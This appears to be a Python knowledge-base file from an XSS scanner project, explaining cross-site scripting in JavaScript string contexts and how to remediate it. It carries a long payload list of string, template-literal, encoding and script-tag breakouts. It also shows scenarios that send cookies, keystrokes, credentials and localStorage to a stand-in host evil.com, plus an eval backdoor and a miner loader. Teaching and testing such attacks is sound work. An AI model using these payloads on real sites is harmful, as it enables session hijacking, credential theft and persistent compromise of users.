#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Modified
Telegram: https://t.me/easyprotech

Knowledge Base: JavaScript String Context - Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in JavaScript String",
    
    "description": """
User input is placed inside a JavaScript string literal without proper escaping. This is EXTREMELY 
common in legacy applications and server-side rendering. Attackers can break out of the string context 
to execute arbitrary code. The complexity increases with ES6 template literals, regex patterns, and 
multi-line strings.

VULNERABILITY CONTEXT:
Occurs when server-side code embeds user data inside JavaScript strings:
- <script>var name = 'USER_INPUT';</script>
- <script>var msg = "USER_INPUT";</script>
- <script>var template = `USER_INPUT`;</script> (ES6)
- <script>var pattern = /USER_INPUT/;</script>
- onclick="alert('USER_INPUT')"
- href="javascript:doSomething('USER_INPUT')"
- Inline event handlers with strings
- JSON strings embedded in JavaScript
- JSONP responses with string data
- Dynamic SQL/template queries in JavaScript

Common in:
- Server-side templates (EJS, Handlebars, Jinja2)
- Legacy PHP/ASP/JSP with inline JavaScript
- Analytics tracking codes
- Configuration objects
- Internationalization (i18n) strings
- Error messages
- User notifications

SEVERITY: CRITICAL
String context XSS allows full JavaScript execution and is one of the most common XSS vectors.
""",

    "attack_vector": """
SINGLE QUOTE STRING BREAKOUT:

1. BASIC BREAKOUT:
   <script>var name = 'USER_INPUT';</script>
   
   Payloads:
   '; alert(1); var x='
   ' + alert(1) + '
   '-alert(1)-'
   
   Result:
   <script>var name = ''; alert(1); var x='';</script>

2. WITH COMMENT:
   Payload:
   '; alert(1);//
   
   Result:
   <script>var name = ''; alert(1);//';</script>
   (Original closing quote is commented out)

3. MULTILINE:
   Payload:
   ';\nalert(1);\nvar x='
   ';\ralert(1);\rvar x='

DOUBLE QUOTE STRING BREAKOUT:

4. BASIC BREAKOUT:
   <script>var msg = "USER_INPUT";</script>
   
   Payloads:
   "; alert(1); var x="
   " + alert(1) + "
   "-alert(1)-"
   
5. MIXED QUOTES:
   Payload in single quote context:
   ' + alert(1) + "
   
   Payload in double quote context:
   " + alert(1) + '

ES6 TEMPLATE LITERAL EXPLOITATION:

6. TEMPLATE LITERAL INJECTION:
   <script>var msg = `Hello USER_INPUT`;</script>
   
   Payloads:
   ${alert(1)}
   ${document.cookie}
   ${fetch('//evil.com?c='+document.cookie)}
   ${eval(atob('YWxlcnQoMSk='))}
   ${constructor.constructor('alert(1)')()}
   ${this.constructor.constructor('alert(1)')()}
   
   Result:
   <script>var msg = `Hello ${alert(1)}`;</script>

7. NESTED TEMPLATE LITERALS:
   ${`nested ${alert(1)}`}
   ${`${`${alert(1)}`}`}

8. TEMPLATE WITH EXPRESSIONS:
   ${(()=>alert(1))()}
   ${[].constructor.constructor('alert(1)')()}

9. BREAKING OUT OF TEMPLATE:
   Payload:
   `; alert(1); var x=`
   ` + alert(1) + `
   
   Result:
   <script>var msg = `Hello `; alert(1); var x=``;</script>

UNICODE AND ENCODING BYPASSES:

10. UNICODE ESCAPES:
    Payloads:
    \\u0027; alert(1); var x=\\u0027  (\\u0027 = ')
    \\u0022; alert(1); var x=\\u0022  (\\u0022 = ")
    \\u0061lert(1)  (\\u0061 = 'a')
    
    In code:
    <script>var x = '\\u0027; alert(1); //';</script>

11. HEX ESCAPES:
    \\x27; alert(1); var x=\\x27  (\\x27 = ')
    \\x22; alert(1); var x=\\x22  (\\x22 = ")
    \\x61lert(1)  (\\x61 = 'a')

12. OCTAL ESCAPES:
    \\047; alert(1); var x=\\047  (\\047 = ')
    \\042; alert(1); var x=\\042  (\\042 = ")
    \\141lert(1)  (\\141 = 'a')

13. MIXED ENCODING:
    \\x27+\\u0061lert(1)+\\x27
    \\u0027;\\x61lert(1);\\u0027

LINE CONTINUATION AND NEWLINE ATTACKS:

14. BACKSLASH LINE CONTINUATION:
    Payload:
    \\\nalert(1)//
    
    Becomes:
    <script>var x = '\\\nalert(1)//';</script>
    
    JavaScript interprets \\\n as line continuation

15. CRLF INJECTION:
    Payload:
    \\r\\nalert(1);//
    \\n'; alert(1); var x='\\n
    
    Result:
    <script>var x = '\\n'; alert(1); var x='\\n';</script>

16. LINE SEPARATOR (U+2028):
    Payload:
    \u2028alert(1)//
    
    JavaScript treats U+2028 as newline but many filters don't

17. PARAGRAPH SEPARATOR (U+2029):
    Payload:
    \u2029alert(1)//

CLOSING SCRIPT TAG ATTACKS:

18. SCRIPT TAG INJECTION:
    <script>var x = 'USER_INPUT';</script>
    
    Payload:
    </script><script>alert(1)</script><script>
    
    Result:
    <script>var x = '</script><script>alert(1)</script><script>';</script>
    
    First script closes, new script executes

19. WITH COMMENT BYPASS:
    Payload:
    </script><script>alert(1)//
    
    Prevents syntax error

20. CASE VARIATIONS:
    </ScRiPt><script>alert(1)</script>
    </SCRIPT><script>alert(1)</script>

HTML COMMENT ATTACKS:

21. HTML COMMENT IN JAVASCRIPT:
    Payload:
    '--></script><script>alert(1)//
    '<!--</script><script>alert(1)//
    
    HTML comments can affect JavaScript parsing in some contexts

REGEX CONTEXT EXPLOITATION:

22. BREAKING OUT OF REGEX:
    <script>var pattern = /USER_INPUT/;</script>
    
    Payloads:
    /; alert(1); var x=/
    /+ alert(1) +/
    []/;alert(1);var x=/[]/
    
    Result:
    <script>var pattern = //; alert(1); var x=//;</script>

23. REGEX WITH FLAGS:
    <script>var pattern = /USER_INPUT/gi;</script>
    
    Payload:
    /;alert(1);var x=/gi;var y=/
    
    Result:
    <script>var pattern = //;alert(1);var x=/gi;var y=/gi;</script>

INLINE EVENT HANDLER CONTEXT:

24. ONCLICK WITH SINGLE QUOTES:
    <button onclick="doSomething('USER_INPUT')">
    
    Payload:
    '); alert(1); doSomething('
    
    Result:
    <button onclick="doSomething(''); alert(1); doSomething('')">

25. ONMOUSEOVER WITH DOUBLE QUOTES:
    <div onmouseover="alert(\"USER_INPUT\")">
    
    Payload:
    \\"); alert(1); alert(\\"
    
    Result:
    <div onmouseover="alert(\\"\\"); alert(1); alert(\\"\")">

TOSTRING() COERCION ATTACKS:

26. OBJECT TO STRING:
    If attacker can control object that gets stringified:
    
    Payload object:
    {toString: function() { return "'; alert(1); var x='"; }}
    
    When used in:
    <script>var x = 'USER_OBJECT';</script>
    
    Object's toString() is called

27. ARRAY TO STRING:
    [1,2,3] becomes "1,2,3" when stringified
    Can exploit if concatenated into strings

EXPLOITATION TECHNIQUES:

28. PROTOTYPE POLLUTION VIA STRING:
    If string manipulation is vulnerable:
    
    Payload:
    __proto__
    constructor[prototype]
    
    Can lead to prototype pollution and XSS

29. EVAL() IN STRING:
    <script>var code = 'eval("USER_INPUT")';</script>
    
    Payload:
    alert(1)
    
    Double evaluation vulnerability

30. FUNCTION() CONSTRUCTOR:
    <script>var fn = new Function('return "USER_INPUT"');</script>
    
    Payload:
    "; alert(1); return "
    
    Result:
    new Function('return ""; alert(1); return ""')

JSON STRING EXPLOITATION:

31. JSON IN JAVASCRIPT:
    <script>var config = '{"key": "USER_INPUT"}';</script>
    
    Payloads:
    ", "exploit": "alert(1)
    "}; alert(1); var x='{"key": "
    
32. JSONP STRING INJECTION:
    callback('{"data": "USER_INPUT"}')
    
    Payload:
    "}); alert(1); callback({"data": "

STRING CONCATENATION ATTACKS:

33. PLUS OPERATOR ABUSE:
    Payload:
    ' + alert(1) + '
    " + alert(1) + "
    
    Result:
    <script>var x = 'test' + alert(1) + 'test';</script>

34. COMMA OPERATOR:
    Payload:
    ', alert(1), '
    
    Result:
    <script>var x = ('test', alert(1), 'test');</script>

35. TERNARY OPERATOR:
    Payload:
    ' + (1?alert(1):0) + '

FRAMEWORK-SPECIFIC ATTACKS:

36. EJS TEMPLATE:
    <script>var msg = '<%= userInput %>';</script>
    
    If not properly escaped:
    '; alert(1); var x='

37. HANDLEBARS:
    <script>var msg = '{{userInput}}';</script>
    
    Payload:
    {{#with this}}'; alert(1); var x='{{/with}}

38. JINJA2:
    <script>var msg = '{{ user_input }}';</script>
    
    If auto-escape is off:
    '; alert(1); var x='

REAL-WORLD ATTACK SCENARIOS:

SESSION HIJACKING:
<script>
var username = 'attacker'; fetch('//evil.com?c='+document.cookie); var x='victim';
</script>

KEYLOGGER:
<script>
var data = ''; document.onkeypress=function(e){fetch('//evil.com?k='+e.key)}; var x='';
</script>

CREDENTIAL THEFT:
<script>
var msg = ''; 
document.body.innerHTML='<form action=//evil.com><input name=user placeholder=Username required><input name=pass type=password placeholder=Password required><button>Login</button></form>';
var x='';
</script>

DATA EXFILTRATION:
<script>
var config = ''; 
fetch('//evil.com/exfil',{method:'POST',body:JSON.stringify({
  cookies:document.cookie,
  localStorage:JSON.stringify(localStorage)
})});
var x='';
</script>

PERSISTENT BACKDOOR:
<script>
var temp = '';
setInterval(()=>{
  fetch('//evil.com/cmd').then(r=>r.text()).then(cmd=>eval(cmd))
},5000);
var x='';
</script>

CRYPTOCURRENCY MINING:
<script>
var user = '';
var s=document.createElement('script');
s.src='//evil.com/coinhive.js';
document.head.appendChild(s);
setTimeout(()=>{new CoinHive.Anonymous('key').start()},1000);
var x='';
</script>
""",

    "remediation": """
DEFENSE-IN-DEPTH STRATEGY:

1. PROPER JAVASCRIPT STRING ESCAPING:
   
   Must escape these characters:
   - \\\\ (backslash) - ESCAPE FIRST!
   - ' (single quote) → \\'
   - " (double quote) → \\"
   - \\n (newline) → \\\\n
   - \\r (carriage return) → \\\\r
   - \\t (tab) → \\\\t
   - \\u2028 (line separator) → \\\\u2028
   - \\u2029 (paragraph separator) → \\\\u2029
   - </script> → <\\/script>
   - <!-- → <\\!--
   
   Python:
   import json
   safe_string = json.dumps(user_input)[1:-1]  # Remove outer quotes
   
   Or manually:
   def escape_js_string(s):
       return s.replace('\\\\', '\\\\\\\\')\\
               .replace("'", "\\\\'")\\
               .replace('"', '\\\\"')\\
               .replace('\\n', '\\\\n')\\
               .replace('\\r', '\\\\r')\\
               .replace('\\u2028', '\\\\u2028')\\
               .replace('\\u2029', '\\\\u2029')\\
               .replace('</', '<\\\\/')
   
   PHP:
   function escapeJsString($str) {
       return json_encode($str, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
   }
   
   JavaScript (Node.js):
   function escapeJsString(str) {
       return str
           .replace(/\\\\/g, '\\\\\\\\')
           .replace(/'/g, "\\\\'")
           .replace(/"/g, '\\\\"')
           .replace(/\\n/g, '\\\\n')
           .replace(/\\r/g, '\\\\r')
           .replace(/\\u2028/g, '\\\\u2028')
           .replace(/\\u2029/g, '\\\\u2029')
           .replace(/<\\//g, '<\\\\/');
   }

2. AVOID INLINE JAVASCRIPT ENTIRELY:
   
   BAD:
   <script>
   var username = '<?php echo $username ?>';
   </script>
   
   GOOD - Use data attributes:
   <div id="user-data" data-username="<?php echo htmlspecialchars($username) ?>"></div>
   
   <script>
   const userData = document.getElementById('user-data');
   const username = userData.dataset.username; // Safe!
   </script>

3. USE JSON SERIALIZATION:
   
   BAD:
   <script>
   var config = {
       name: '<?php echo $name ?>',
       email: '<?php echo $email ?>'
   };
   </script>
   
   GOOD:
   <script>
   var config = <?php echo json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
   </script>

4. SCRIPT TYPE='APPLICATION/JSON':
   
   Best practice:
   <script type="application/json" id="config-data">
   <?php echo json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP); ?>
   </script>
   
   <script>
   const configData = JSON.parse(
       document.getElementById('config-data').textContent
   );
   </script>

5. CONTENT SECURITY POLICY:
   
   Block inline event handlers:
   Content-Security-Policy: 
     default-src 'self';
     script-src 'self' 'nonce-RANDOM123';
   
   This prevents onclick="..." attacks

6. USE SAFE APIS:
   
   GOOD:
   element.textContent = userInput;
   element.setAttribute('data-value', userInput);
   
   BAD:
   element.onclick = "doSomething('" + userInput + "')";
   element.setAttribute('onclick', code);

7. FRAMEWORK AUTO-ESCAPING:
   
   React (Safe by default):
   const username = userInput; // No need to escape in JSX
   return <div>{username}</div>;
   
   Vue (Safe in templates):
   <template>
     <div>{{ userInput }}</div>
   </template>
   
   Angular (Safe by default):
   <div>{{ userInput }}</div>
   
   All automatically escape for JavaScript string context

8. TEMPLATE ENGINE CONFIGURATION:
   
   EJS:
   <%= userInput %>  <!-- HTML escaped -->
   <%- userInput %>  <!-- Raw, dangerous -->
   
   Handlebars:
   {{userInput}}     <!-- Escaped -->
   {{{userInput}}}   <!-- Raw, dangerous -->
   
   Jinja2:
   {{ user_input }}  <!-- Auto-escaped if configured -->
   {{ user_input|e }}  <!-- Explicitly escaped -->

9. VALIDATE INPUT:
   
   For expected formats:
   
   Username:
   if (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $username)) {
       die('Invalid username');
   }
   
   Numeric:
   $age = intval($_POST['age']);
   if ($age < 0 || $age > 150) die('Invalid age');

10. TRUSTED TYPES API:
    
    Content-Security-Policy: require-trusted-types-for 'script'
    
    JavaScript:
    const policy = trustedTypes.createPolicy('default', {
        createScript: (input) => {
            // Sanitize
            return sanitize(input);
        }
    });

SECURITY CHECKLIST:

[ ] No user input placed directly in JavaScript strings
[ ] All JavaScript strings properly escaped (backslash first!)
[ ] Escape \\u2028 and \\u2029 (line/paragraph separators)
[ ] Escape </script> and <!-- in strings
[ ] Use data attributes instead of inline JavaScript
[ ] Use JSON serialization with proper flags
[ ] CSP configured to block inline event handlers
[ ] Framework auto-escaping enabled
[ ] Template engine escape syntax used correctly
[ ] No eval() or Function() with user input
[ ] Input validation for expected formats
[ ] Regular security testing
[ ] Code review for all JavaScript string usage
[ ] Developer training on string context XSS

TESTING PAYLOADS:

Single quote breakout:
'; alert(1); var x='
'; alert(1);//

Double quote breakout:
"; alert(1); var x="
"; alert(1);//

Template literal:
${alert(1)}

Unicode escape:
\\u0027; alert(1); var x=\\u0027

Script tag breakout:
</script><script>alert(1)</script><script>

Regex breakout:
/; alert(1); var x=/

Line separator:
\\u2028alert(1)//

OWASP REFERENCES:
- OWASP XSS Prevention Cheat Sheet: Rule #3
- CWE-79: Improper Neutralization of Input During Web Page Generation
- JavaScript String Escape Sequences
- Content Security Policy Level 3
- OWASP Testing Guide: Testing for JavaScript Execution
"""
}
